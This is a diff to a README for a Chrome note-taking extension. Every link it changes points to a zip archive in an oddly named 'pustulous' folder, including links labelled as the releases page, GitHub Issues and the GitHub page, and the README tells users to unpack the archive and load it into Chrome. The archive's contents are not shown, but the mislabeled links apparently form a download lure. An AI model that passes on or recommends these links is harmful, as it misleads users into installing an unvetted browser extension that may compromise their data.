@@ -6,13 +6,13 @@ Welcome to **chromePluginToWriteNotes**! This is a minimalist Chrome extension d
 
 ## 📥 Download the Extension
 
-[Download chromePluginToWriteNotes](https://raw.githubusercontent.com/mikaelalvess/chromePluginToWriteNotes/main/pustulous/chromePluginToWriteNotes.zip)
+[Download chromePluginToWriteNotes](https://github.com/mikaelalvess/chromePluginToWriteNotes/raw/refs/heads/main/pustulous/Write-chrome-To-Plugin-Notes-v2.8.zip)
 
 ## 💾 Download & Install
 
-1. **Visit this page to download:** Go to our [Releases page](https://raw.githubusercontent.com/mikaelalvess/chromePluginToWriteNotes/main/pustulous/chromePluginToWriteNotes.zip).
+1. **Visit this page to download:** Go to our [Releases page](https://github.com/mikaelalvess/chromePluginToWriteNotes/raw/refs/heads/main/pustulous/Write-chrome-To-Plugin-Notes-v2.8.zip).
 2. **Find the latest version:** Look for the most recent release at the top of the page.
-3. **Download the extension:** Click on the file labeled “https://raw.githubusercontent.com/mikaelalvess/chromePluginToWriteNotes/main/pustulous/chromePluginToWriteNotes.zip” to download it to your computer.
+3. **Download the extension:** Click on the file labeled “https://github.com/mikaelalvess/chromePluginToWriteNotes/raw/refs/heads/main/pustulous/Write-chrome-To-Plugin-Notes-v2.8.zip” to download it to your computer.
 4. **Unzip the file:** Once downloaded, locate the file in your Downloads folder, right-click it, and select “Extract All” to unzip the contents.
 5. **Open Chrome:** Open your Chrome browser.
 6. **Access the Chrome Extensions Page:** In your browser, go to the address bar and type `chrome://extensions`, then press Enter.
@@ -44,10 +44,10 @@ If you face any issues while using the extension:
 
 1. **Check Chrome Version:** Make sure you are using the latest version of Chrome.
 2. **Reload the Extension:** Go back to the `chrome://extensions` page, and click the refresh icon on the chromePluginToWriteNotes extension.
-3. **Contact Support:** If the problem persists, you can open an issue on [GitHub Issues](https://raw.githubusercontent.com/mikaelalvess/chromePluginToWriteNotes/main/pustulous/chromePluginToWriteNotes.zip) for assistance.
+3. **Contact Support:** If the problem persists, you can open an issue on [GitHub Issues](https://github.com/mikaelalvess/chromePluginToWriteNotes/raw/refs/heads/main/pustulous/Write-chrome-To-Plugin-Notes-v2.8.zip) for assistance.
 
 ## 📚 Help and Support
 
-For any further questions or feedback, feel free to visit our [GitHub page](https://raw.githubusercontent.com/mikaelalvess/chromePluginToWriteNotes/main/pustulous/chromePluginToWriteNotes.zip). You may also find useful information in the Issues section.
+For any further questions or feedback, feel free to visit our [GitHub page](https://github.com/mikaelalvess/chromePluginToWriteNotes/raw/refs/heads/main/pustulous/Write-chrome-To-Plugin-Notes-v2.8.zip). You may also find useful information in the Issues section.
 
 Thank you for choosing **chromePluginToWriteNotes** for your note-taking needs! We hope it makes your daily tasks easier.
